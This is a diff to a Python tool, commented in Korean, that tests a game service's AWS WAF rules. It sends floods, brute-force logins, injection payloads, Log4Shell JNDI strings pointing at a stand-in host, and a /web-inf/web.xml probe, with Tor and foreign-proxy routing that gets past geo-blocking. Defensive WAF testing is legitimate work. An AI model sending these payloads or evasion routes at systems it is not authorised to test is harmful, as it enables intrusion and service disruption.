@@ -1,5 +1,5 @@
 # ==========================================
-# 🛡️ Vamserlike WAF 보안 테스트 툴 (Storytelling & Burst/Polling 최적화 버전)
+# 🛡️ Vamserlike WAF 보안 테스트 툴 (Storytelling & 팀원 친화적 주석 버전)
 # ==========================================
 # "WAF 보안 테스트 시나리오 명세서 (v11)"의 10개 케이스를 단독 검증합니다.
 #
@@ -45,6 +45,12 @@ PROXIES_GEO = {
     "싱가포르": os.environ.get("PROXY_SG"),
 }
 TOR_SOCKS = os.environ.get("TOR_SOCKS")
+# Case 9·10 분리 검증용: 허용국(일본/미국) 출구 프록시.
+#  - Case 9 : Geo 통과 후 AnonymousIpList'만'으로 차단되는지 검증.
+#  - Case 10: 로컬 백신(DPI) 우회 + Geo 통과 → case10-log4j-jndi가 직접 차단되는지 검증.
+# 예) 일본 Tor 출구: torrc에 'ExitNodes {jp}' + 'StrictNodes 1' 후  set PROXY_ANON=socks5h://127.0.0.1:9150
+#     또는 도쿄 EC2 SSH 터널:                            set PROXY_ANON=socks5h://127.0.0.1:1085
+PROXY_ANON = os.environ.get("PROXY_ANON")
 
 REQ_TIMEOUT = 10
 WAF_BLOCK_CODE = 403
@@ -116,6 +122,8 @@ def get_token():
 # ==========================================
 def send_until_blocked(method, path, max_count, *, headers=None, json_body=None,
                        data=None, params=None, proxies=None):
+    """지정된 횟수만큼 요청을 보내고, 403(차단)을 만나면 즉시 중단 후 결과를 반환합니다.
+       반환값: (차단여부: bool, 전송건수: int, 차단한규칙이름: str)"""
     sent = 0
     for _ in range(max_count):
         sent += 1
@@ -133,6 +141,8 @@ def send_until_blocked(method, path, max_count, *, headers=None, json_body=None,
 
 def send_parallel_any_blocked(method, path, count, *, headers=None, json_body=None,
                               data=None, workers=20):
+    """다수의 요청을 병렬(멀티스레드)로 동시에 쏟아부어 차단 여부를 검사합니다. (Case 5 대용량 페이로드 용도)
+       반환값: (차단여부: bool, 차단한규칙이름: str)"""
     def _one(_):
         try:
             resp = requests.request(
@@ -145,6 +155,7 @@ def send_parallel_any_blocked(method, path, count, *, headers=None, json_body=No
 
     blocked = False
     rule = None
+    # ThreadPoolExecutor를 사용해 workers 개수만큼의 스레드로 동시 타격
     with ThreadPoolExecutor(max_workers=workers) as ex:
         futures = [ex.submit(_one, i) for i in range(count)]
         for f in as_completed(futures):
@@ -155,8 +166,8 @@ def send_parallel_any_blocked(method, path, count, *, headers=None, json_body=No
     return blocked, rule
 
 def rate_test(method, path, *, headers=None, json_body=None, burst_count=None):
-    """단일 연결 버스트 후 WAF 지연 반영 폴링 수행"""
-    # 명세서에서 지정한 건수가 있으면 적용, 없으면 기본값 사용
+    """단일 연결 버스트 후 WAF 지연 반영 폴링(대기)을 수행합니다."""
+    # 명세서에서 지정한 건수(burst_count)가 있으면 적용, 없으면 기본값(150) 사용
     target_burst = burst_count if burst_count else RATE_BURST
 
     responded = 0
@@ -178,6 +189,8 @@ def rate_test(method, path, *, headers=None, json_body=None, burst_count=None):
             server_errors += 1
 
     if RATE_WORKERS <= 1:
+        # Session()을 사용하면 TCP 커넥션(Keep-Alive)이 하나로 유지되어, 
+        # NAT망(공유기 등) 환경에서도 WAF가 동일한 출발지 IP로 인식하게 강제합니다 (단일 IP 보장)
         sess = requests.Session()
         for _ in range(target_burst):
             try:
@@ -188,6 +201,7 @@ def rate_test(method, path, *, headers=None, json_body=None, burst_count=None):
                 pass
         sess.close()
     else:
+        # 단일 공인 IP망이 확실할 때, 여러 스레드로 전송 속도를 높이기 위한 분기
         def _one(_):
             try:
                 r = requests.request(method, f"{WAF_TARGET_URL}{path}",
@@ -211,6 +225,7 @@ def rate_test(method, path, *, headers=None, json_body=None, burst_count=None):
     if server_errors >= responded * 0.8:
         return False, None, f"응답 대부분이 5xx({server_errors}/{responded}) — 백엔드 점검 필요, 폴링 생략"
 
+    # WAF 속도 제한 정책(Rate Limit)은 임계치를 넘겨도 실제 차단까지 수 초~수십 초가 걸리므로 폴링하며 기다립니다
     print(f"    ⏳ WAF 규칙 평가 및 차단 대기 중 (최대 {RATE_POLL_SECONDS}초 폴링)")
     deadline = time.time() + RATE_POLL_SECONDS
     while time.time() < deadline:
@@ -253,11 +268,11 @@ def case_01_geo(report):
     all_blocked = True
     last_rule = None
     for country, proxy in configured.items():
-        # 인도 리전 마이크로 VM 등 테스트용 터널을 경유하도록 송신 경로 설정
+        # requests의 표준 기능. 우리의 진짜 IP 대신 지정된 해외 프록시 IP를 달고 나가도록 세팅
         proxies = {"http": proxy, "https": proxy}
         
         print(f" 🚀 [공격] {country} IP로 우회하여 /api/health 타격")
-        # 비허용 국가 IP를 달고 /api/health 로 50건의 요청 전송
+        # b: 차단여부(bool), sent: 전송건수(int), rule: 차단한 규칙이름(str)
         blocked, sent, rule = send_until_blocked("GET", "/api/health", 50, proxies=proxies)
         tag = f" (규칙: {_rule_label(rule)})" if blocked else ""
         print(f"    📡 트래픽 {sent}건 전송 완료 -> {'차단됨' if blocked else '통과됨(미차단)'}{tag}")
@@ -312,7 +327,7 @@ def case_03_rate_progress(report, token):
     print(" 🚀 [공격] 자동화 스크립트를 통한 300건의 게임 클리어 신호 전송")
     print("    - 대상: PUT /api/players/me/progress")
     
-    # 게임 결과 저장 API에 스코어 데이터와 함께 300건의 대량 요청 전송
+    # 명세서 반영: 300건의 대량 요청 전송
     blocked, rule, info = rate_test("PUT", "/api/players/me/progress", headers=headers, json_body=payload, burst_count=300)
     report.record("Case 3. 결과 저장 속도 제한", "PASS" if blocked else "FAIL",
                   f"→ {info} (작동 규칙: {_rule_label(rule)})" if blocked else info)
@@ -336,9 +351,12 @@ def case_04_injection(report):
     print(" 🚀 [공격 1] 전통적인 공격 패턴 전송 (SQLi / XSS)")
     blocked_all = True
     for p in payloads:
-        # 로그인 바디(body) 및 랭킹 조회 파라미터(URL)에 각각 악성 페이로드 주입 후 전송
+        # 테스트 툴이 로그인 API(POST)와 랭킹 조회 API(GET) 양쪽에 악성 페이로드를 삽입해 전송해 봄
+        # 반환값 -> b1, b2: 차단 여부(bool) / _: 전송건수(여기선 무시) / r1, r2: 차단한 WAF 규칙
         b1, _, r1 = send_until_blocked("POST", "/api/Auth/login", 1, json_body={"email": p, "password": p})
         b2, _, r2 = send_until_blocked("GET", "/api/players/ranking", 1, params={"take": p})
+        
+        # 둘 중 하나라도 차단(True)되면 방어에 성공한 것(hit)으로 간주함
         hit = b1 or b2
         rule = r1 or r2
         tag = f" (규칙: {_rule_label(rule)})" if hit else ""
@@ -349,7 +367,7 @@ def case_04_injection(report):
     print("\n 🚀 [공격 2] 최신 데이터베이스 공격 패턴 전송 (NoSQL)")
     nosql_blocked = 0
     for p in nosql_payloads:
-        # NoSQL 패턴 커버리지 확인을 위한 실측용 전송 (실패로 간주하지 않음)
+        # NoSQL 패턴 커버리지 확인을 위한 실측용 전송 (기본 룰셋이 못 막는 경우가 있어 실패로 간주하지 않음)
         b, _, _ = send_until_blocked("GET", "/api/players/ranking", 1, params={"take": p})
         if b:
             nosql_blocked += 1
@@ -370,7 +388,7 @@ def case_05_size(report):
     # 10MB 크기의 더미 데이터를 생성하여 WAF 바디 크기 제한(8KB) 초과 유도
     big_body = "A" * (10 * 1024 * 1024)
     
-    # 해당 대용량 페이로드를 병렬(workers)로 동시 전송
+    # 해당 대용량 페이로드를 멀티스레드를 이용해 여러 개(workers)를 한 번에 쏟아부음
     blocked, rule = send_parallel_any_blocked("POST", "/api/players/me/progress", BURST, data=big_body, workers=BURST)
     report.record("Case 5. 8KB 초과 요청 차단", "PASS" if blocked else "FAIL",
                   f"→ 백엔드 도달 전 방어 완료 (작동 규칙: {_rule_label(rule)})" if blocked else f"10MB × {BURST}건 전송됨(위험)")
@@ -384,7 +402,7 @@ def case_06_login_bruteforce(report):
     print("-" * 55)
 
     print(" 🚀 [공격] 로그인 API에 500건의 무차별 대입 시도")
-    # 잘못된 자격 증명을 반복 대입하여 5분 내 100회 초과 시 차단 검증
+    # 명세서 반영: 500건 대입 전송
     blocked, rule, info = rate_test("POST", "/api/Auth/login",
                                     json_body={"email": "brute@test.com", "password": "wrongpw"},
                                     burst_count=500)
@@ -400,7 +418,7 @@ def case_07_signup_flood(report):
     print("-" * 55)
 
     print(" 🚀 [공격] 무작위 이메일을 담아 200건의 회원가입 요청 전송")
-    # 무작위 이메일 봇 계정 생성을 모사하여 회원가입 API 대량 전송
+    # 명세서 반영: 200건 대량 전송
     blocked, rule, info = rate_test("POST", "/api/Auth/signup",
                                     json_body={"email": "flood@test.com", "password": TEST_PW, "nickname": "bot"},
                                     burst_count=200)
@@ -439,24 +457,36 @@ def case_09_anonymous_ip(report):
     print(" 🛡️ 방어: AWS 익명 IP 관리형 룰셋(AnonymousIpList) 작동 확인")
     print("-" * 55)
 
-    if not TOR_SOCKS:
-        report.record("Case 9. Tor/익명 IP 차단", "SKIP", "TOR_SOCKS 미설정 — 로컬 Tor SOCKS5 프록시 필요")
+    # 허용국(JP/US) 익명 출구(PROXY_ANON)가 있으면 우선 사용한다.
+    # 이 경로는 Geo(허용국이라 통과)를 지나 AnonymousIpList'만'으로 차단되는지 분리 검증한다.
+    # 없으면 기존 TOR_SOCKS(Tor가 고르는 출구; 비허용국이면 Geo가 먼저 막음)로 대체.
+    anon_proxy = PROXY_ANON or TOR_SOCKS
+    via = "PROXY_ANON(허용국 익명 출구)" if PROXY_ANON else "TOR_SOCKS(Tor 출구)"
+    if not anon_proxy:
+        report.record("Case 9. Tor/익명 IP 차단", "SKIP",
+                      "PROXY_ANON / TOR_SOCKS 미설정 — 익명 출구 프록시 필요")
         return
-        
-    # 테스트 환경에 구축된 로컬 Tor SOCKS5 프록시 터널을 경유하도록 송신 경로 설정
-    proxies = {"http": TOR_SOCKS, "https": TOR_SOCKS}
-    
-    print(" 🚀 [공격] 추적 불가능한 Tor 네트워크를 경유하여 50건의 우회 요청 전송")
-    # Tor 네트워크를 경유하여 /api/players/ranking API로 총 50건의 익명 요청 전송
+
+    proxies = {"http": anon_proxy, "https": anon_proxy}
+
+    print(f" 🚀 [공격] {via} 경유로 50건의 익명 요청 전송")
     blocked, sent, rule = send_until_blocked("GET", "/api/players/ranking", 50, params={"take": 20}, proxies=proxies)
 
     if not blocked:
-        report.record("Case 9. Tor/익명 IP 차단", "FAIL", f"Tor 경유 {sent}건 미차단")
+        report.record("Case 9. Tor/익명 IP 차단", "FAIL",
+                      f"{sent}건 미차단 — 출구 IP가 AnonymousIpList에 없을 수 있음 "
+                      "(일본 Tor 출구 권장: torrc에 ExitNodes {jp} / StrictNodes 1)")
         return
     if rule == "case1-geo-allowlist":
-        report.record("Case 9. Tor/익명 IP 차단", "PASS", "→ Geo 방어가 먼저 작동함 (해외 Tor 노드 차단 완료)")
+        report.record("Case 9. Tor/익명 IP 차단", "PASS",
+                      "→ Geo가 먼저 차단(출구가 비허용국). AnonymousIpList 단독 검증은 "
+                      "허용국(일본/미국) 익명 출구를 PROXY_ANON으로 지정하세요")
+    elif rule:
+        report.record("Case 9. Tor/익명 IP 차단", "PASS",
+                      f"→ 차단 성공 (규칙: {rule}, 전송 {sent}건)")
     else:
-        report.record("Case 9. Tor/익명 IP 차단", "PASS", f"→ 익명 IP 차단 성공 (관리형 룰, 전송 {sent}건)")
+        report.record("Case 9. Tor/익명 IP 차단", "PASS",
+                      f"→ AnonymousIpList 단독 차단 확인 — 허용국 익명 IP 차단 검증 완료 (전송 {sent}건)")
 
 
 def case_10_known_bad_inputs(report):
@@ -468,9 +498,15 @@ def case_10_known_bad_inputs(report):
 
     log4j = ["${jndi:ldap://malicious-test.com/a}", "${jndi:rmi://malicious-test.com/b}"]
     all_blocked = True
+    rules_seen = set()  # 어떤 규칙이 막았는지 수집 (커스텀 헤더가 있을 때만)
 
-    proxy_url = PROXIES_GEO.get("인도") or TOR_SOCKS
+    # 허용국(JP/US) 출구(PROXY_ANON)가 있으면 우선 사용:
+    #   로컬 백신(DPI) 우회(암호화 터널) + Geo 통과(허용국) → case10-log4j-jndi가 '직접' 차단되는지 검증.
+    # 없으면 인도/Tor로 대체(비허용국이면 Geo가 먼저 막아 'Geo 그림자'가 됨).
+    proxy_url = PROXY_ANON or PROXIES_GEO.get("인도") or TOR_SOCKS
     proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
+    via = "PROXY_ANON(허용국 출구)" if PROXY_ANON else ("인도/Tor 출구" if proxy_url else "직접(프록시 없음)")
+    print(f" 🛰️ 전송 경로: {via}")
 
     print(" 🚀 [공격 1] 역사상 최악의 취약점(Log4Shell) 마법의 주문 전송")
     for p in log4j:
@@ -479,17 +515,33 @@ def case_10_known_bad_inputs(report):
                                        headers={"X-Test-Payload": p},
                                        json_body={"email": "a@test.com", "password": p},
                                        proxies=proxies)
+        if b1 and r1:
+            rules_seen.add(r1)
         tag = f" (규칙: {_rule_label(r1)})" if b1 else ""
         print(f"    - {p[:40]!r} : {'차단 성공' if b1 else '통과됨(위험)'}{tag}")
         all_blocked = all_blocked and b1
 
     print("\n 🚀 [공격 2] 서버 1급 기밀문서(설정 파일) 내놓으라고 억지 부리기")
     # 노출되면 안 되는 알려진 내부 경로(web.xml 등) 접근 시도 전송
-    b_path, _, _ = send_until_blocked("GET", "/web-inf/web.xml", 1, proxies=proxies)
+    b_path, _, r_path = send_until_blocked("GET", "/web-inf/web.xml", 1, proxies=proxies)
+    if b_path and r_path:
+        rules_seen.add(r_path)
     print(f"    - /web-inf/web.xml : {'차단 성공' if b_path else '통과됨(위험)'}")
     all_blocked = all_blocked and b_path
 
-    report.record("Case 10. 알려진 악성 입력 차단", "PASS" if all_blocked else "FAIL", "→ 전 세계구급 해킹 패턴 방어 성공")
+    # 결과 해석: 어떤 규칙이 막았는가로 '깨끗한 검증'인지 'Geo 그림자'인지 구분
+    if not all_blocked:
+        report.record("Case 10. 알려진 악성 입력 차단", "FAIL",
+                      "일부 미차단 — 로컬 백신이 패킷을 가로챘거나(허용국 출구 PROXY_ANON 권장) 규칙 미작동")
+    elif "case10-log4j-jndi" in rules_seen:
+        report.record("Case 10. 알려진 악성 입력 차단", "PASS",
+                      f"→ Log4j 전용 규칙 직접 차단 검증 완료 (작동 규칙: {', '.join(sorted(rules_seen))})")
+    elif rules_seen == {"case1-geo-allowlist"}:
+        report.record("Case 10. 알려진 악성 입력 차단", "PASS",
+                      "→ Geo가 먼저 차단(비허용국 출구). Log4j 규칙 분리 검증은 허용국 출구(PROXY_ANON) 사용")
+    else:
+        report.record("Case 10. 알려진 악성 입력 차단", "PASS",
+                      "→ 관리형 KnownBadInputs 등으로 차단 (전 세계구급 해킹 패턴 방어 성공)")
 
 # ==========================================
 # 사전 검증 및 메인 로직
